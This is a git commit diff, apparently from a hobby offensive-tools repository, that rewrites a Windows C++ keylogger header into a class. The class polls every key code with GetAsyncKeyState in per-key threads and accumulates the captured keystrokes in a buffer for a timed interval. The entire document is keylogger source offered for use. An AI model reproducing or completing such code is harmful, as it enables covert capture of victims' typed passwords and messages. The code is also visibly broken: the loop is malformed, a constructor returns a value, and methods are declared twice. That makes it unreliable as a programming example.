404cfc9a3ab38221a5f07572c40e54943556df6a
d34thn3t <safiy.malik@gmail.com>
2017-03-22 12:37:17 -0700

    keylogger completed

--- ReverseC++/KeyLogger.h
+++ ReverseC++/KeyLogger.h
@@ -34,167 +34,197 @@
 
 #define SHIFT 0x10
 
-void KeyLogger();
+class KeyLogger {
 
-bool KeyCheck(int KeyNum);
+public:
 
-std::string KeyToChar(int KeyNum);
+	KeyLogger(int Seconds);
 
-std::string BufferString;
+	~KeyLogger();
 
-void RecursiveKeyCheck(int KeyNum);
+	bool KeyCheck(int KeyNum);
 
-bool Stop = false;
+	std::string KeyToChar(int KeyNum);
 
-std::string KeyToChar(int KeyNum) {
+	std::string BufferString;
 
-	switch(KeyNum){
+	DWORD WINAPI RecursiveKeyCheck(int KeyNum);
 
-	case ZERO:
+	bool Stop = false;
 
-		return "0";
+	std::string KeyToChar(int KeyNum) {
 
-		break;
+		switch (KeyNum) {
 
-	case ONE:
+		case ZERO:
 
-		return "1";
-		
-		break;
-
-	case TWO:
-
-		return "2";
-
-		break;
-
-	case THREE:
-
-		return "3";
-
-		break;
-
-	case FOUR:
-
-		return "4";
-
-		break;
-
-	case FIVE:
-
-		return "5";
-
-		break;
-
-	case SIX:
-
-		return "6";
-
-		break;
-
-	case SEVEN:
-
-		return "7";
-
-		break;
-
-	case EIGHT:
-
-		return "8";
-
-		break;
-
-	case NINE:
-
-		return "9";
-
-		break;
-
-	case TAB:
-
-		return "<TAB>";
-
-		break;
-
-	case BACKSPACE:
-
-		return "<BACKSPACE>";
-
-		break;
-
-	case ENTER:
-
-		return "<ENTER>";
-
-		break;
-
-	case SHIFT:
-
-		return "<SHIFT>";
-
-		break;
-
-	case CAPSLOCK:
-
-		return "<CAPSLOCK>";
-
-		break;
-
-	case SPACE:
-
-		return " ";
-
-		break;
-
-	default:
-
-		std::string HexString;
-
-		char HexCharacter = (char)KeyNum;
-
-		HexString += HexCharacter;
-
-		return HexString;
-
-	}
-
-}
-
-void RecursiveKeyCheck(int KeyNum) {
-
-	while (true) {
-
-		if (Stop) {
+			return "0";
 
 			break;
 
+		case ONE:
+
+			return "1";
+
+			break;
+
+		case TWO:
+
+			return "2";
+
+			break;
+
+		case THREE:
+
+			return "3";
+
+			break;
+
+		case FOUR:
+
+			return "4";
+
+			break;
+
+		case FIVE:
+
+			return "5";
+
+			break;
+
+		case SIX:
+
+			return "6";
+
+			break;
+
+		case SEVEN:
+
+			return "7";
+
+			break;
+
+		case EIGHT:
+
+			return "8";
+
+			break;
+
+		case NINE:
+
+			return "9";
+
+			break;
+
+		case TAB:
+
+			return "<TAB>";
+
+			break;
+
+		case BACKSPACE:
+
+			return "<BACKSPACE>";
+
+			break;
+
+		case ENTER:
+
+			return "<ENTER>";
+
+			break;
+
+		case SHIFT:
+
+			return "<SHIFT>";
+
+			break;
+
+		case CAPSLOCK:
+
+			return "<CAPSLOCK>";
+
+			break;
+
+		case SPACE:
+
+			return " ";
+
+			break;
+
+		default:
+
+			std::string HexString;
+
+			char HexCharacter = (char)KeyNum;
+
+			HexString += HexCharacter;
+
+			return HexString;
+
 		}
 
-		if (KeyCheck(KeyNum)) {
+	}
 
-			BufferString+=KeyToChar(KeyNum);
+	DWORD WINAPI RecursiveKeyCheck(int KeyNum) {
+
+		while (true) {
+
+			if (Stop) {
+
+				return 0;
+
+			}
+
+			if (KeyCheck(KeyNum)) {
+
+				BufferString += KeyToChar(KeyNum);
+
+			}
+
+		}
+
+		return 0;
+
+	}
+
+	bool KeyCheck(int KeyNum) {
+
+		int KeyStat = GetAsyncKeyState(KeyNum);
+
+		if (KeyStat > 0) {
+
+			return true;
+
+		}
+
+		else {
+
+			return false;
 
 		}
 
 	}
 
-}
+	KeyLogger(int Seconds) {
 
-bool KeyCheck(int KeyNum) {
+		for (int I; I++; I < 0xFE) {
 
-	int KeyStat = GetAsyncKeyState(KeyNum);
+			CreateThread(NULL, 512, RecursiveKeyCheck, I, NULL);
 
-	if (KeyStat > 0) {
+		}
 
-		return true;
+		Sleep(Seconds);
+
+		Stop = true;
+
+		char * Buffer = new char[BufferString.length() + 1];
+
+		strncpy(Buffer, BufferString.c_str(), BufferString.length());
+
+		return Buffer;
 
 	}
 
-	else { 
-
-		return false; 
-	
-	}
-
-}
-//incomplete
+};
+//final
